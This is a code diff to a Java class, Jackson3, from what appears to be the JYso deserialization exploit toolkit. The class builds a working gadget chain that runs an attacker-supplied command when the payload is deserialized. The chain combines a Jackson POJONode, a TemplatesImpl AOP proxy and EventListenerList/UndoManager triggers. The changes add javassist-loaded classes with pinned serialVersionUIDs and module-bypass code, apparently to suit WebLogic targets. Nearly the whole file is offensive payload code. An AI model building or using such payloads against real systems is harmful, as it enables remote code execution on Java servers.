@@ -1,9 +1,11 @@
 package com.qi4l.JYso.gadgets;
 
 import com.fasterxml.jackson.databind.node.POJONode;
+import com.qi4l.JYso.gadgets.utils.SuClassLoader;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.qi4l.JYso.gadgets.utils.Gadgets;
 
+import javassist.ClassClassPath;
 import sun.misc.Unsafe;
 
 import org.springframework.aop.framework.AdvisedSupport;
@@ -11,6 +13,7 @@ import org.springframework.aop.framework.AdvisedSupport;
 import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtMethod;
+import weblogic.apache.xpath.objects.XObject;
 
 import javax.swing.event.EventListenerList;
 import javax.swing.undo.UndoManager;
@@ -22,8 +25,10 @@ import java.lang.reflect.Proxy;
 import java.lang.reflect.*;
 
 import java.util.ArrayList;
+import java.util.Comparator;
 import java.util.Vector;
 
+import static com.qi4l.JYso.gadgets.Config.Config.POOL;
 import static com.qi4l.JYso.gadgets.utils.InjShell.insertField;
 
 
@@ -39,36 +44,19 @@ public class Jackson3 implements ObjectPayload<Object> {
         return proxy;
     }
 
-    @Override
-    public Object getObject(final String command) throws Exception {
-        try {
-            CtClass  ctClass      = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
-            CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
-            ctClass.removeMethod(writeReplace);
-            ctClass.toClass();
-        } catch (Exception EE) {
+    public static Object getEventListenerList(Object obj) throws Exception {
+        //EventListenerList list = new EventListenerList();
+        POOL.insertClassPath(new ClassClassPath(Class.forName("javax.swing.event.EventListenerList")));
+        final CtClass ctEventListenerList = POOL.get("javax.swing.event.EventListenerList");
+        insertField(ctEventListenerList, "serialVersionUID", "private static final long serialVersionUID = -7977902244297240866L;");
+        Object list = ctEventListenerList.toClass(new SuClassLoader()).newInstance();
 
-        }
+        //UndoManager undomanager = new UndoManager();
+        POOL.insertClassPath(new ClassClassPath(Class.forName("javax.swing.undo.UndoManager")));
+        final CtClass ctUndoManager = POOL.get("javax.swing.undo.UndoManager");
+        insertField(ctUndoManager, "serialVersionUID", "private static final long serialVersionUID = -1045223116463488483L;");
+        Object undomanager = ctUndoManager.toClass(new SuClassLoader()).newInstance();
 
-        ArrayList<Class> classes = new ArrayList<>();
-        classes.add(TemplatesImpl.class);
-        classes.add(POJONode.class);
-        classes.add(EventListenerList.class);
-        classes.add(Jackson3.class);
-        classes.add(Field.class);
-        classes.add(Method.class);
-        new Jackson3().bypassModule(classes);
-
-        POJONode node = new POJONode(makeTemplatesImplAopProxy(command));
-
-        EventListenerList eventListenerList = getEventListenerList(node);
-
-        return getEventListenerList(node);
-    }
-
-    public static EventListenerList getEventListenerList(Object obj) throws Exception {
-        EventListenerList list        = new EventListenerList();
-        UndoManager       undomanager = new UndoManager();
         //取出UndoManager类的父类CompoundEdit类的edits属性里的vector对象，并把需要触发toString的类add进去。
         Vector vector = (Vector) getFieldValue(undomanager, "edits");
         vector.add(obj);
@@ -121,8 +109,7 @@ public class Jackson3 implements ObjectPayload<Object> {
         }
     }
 
-    public static Object getFieldValue(Object obj, String fieldName) throws
-            Exception {
+    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
         Field field = null;
         Class c     = obj.getClass();
         for (int i = 0; i < 5; i++) {
@@ -136,10 +123,38 @@ public class Jackson3 implements ObjectPayload<Object> {
         return field.get(obj);
     }
 
-    public static void setFieldValue(Object obj, String field, Object val) throws
-            Exception {
+    public static void setFieldValue(Object obj, String field, Object val) throws Exception {
         Field dField = obj.getClass().getDeclaredField(field);
         dField.setAccessible(true);
         dField.set(obj, val);
     }
+
+    @Override
+    public Object getObject(final String command) throws Exception {
+        try {
+            CtClass  ctClass      = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
+            CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
+            ctClass.removeMethod(writeReplace);
+            ctClass.toClass();
+        } catch (Exception EE) {
+
+        }
+
+        ArrayList<Class> classes = new ArrayList<>();
+        classes.add(TemplatesImpl.class);
+        classes.add(POJONode.class);
+        classes.add(EventListenerList.class);
+        classes.add(Jackson3.class);
+        classes.add(Field.class);
+        classes.add(Method.class);
+        new Jackson3().bypassModule(classes);
+
+        POJONode node = new POJONode(makeTemplatesImplAopProxy(command));
+
+        Object eventListenerList = getEventListenerList(node);
+
+        return eventListenerList;
+    }
+
+
 }
